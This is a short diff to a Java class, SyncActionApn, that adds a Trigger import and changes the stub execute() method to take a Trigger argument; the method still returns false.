@@ -11,6 +11,7 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
+import com.android.service.Trigger;
 import com.android.service.conf.ConfAction;
 
 // TODO: Auto-generated Javadoc
@@ -35,7 +36,7 @@ public class SyncActionApn extends SubAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		// TODO Auto-generated method stub
 		return false;
 	}
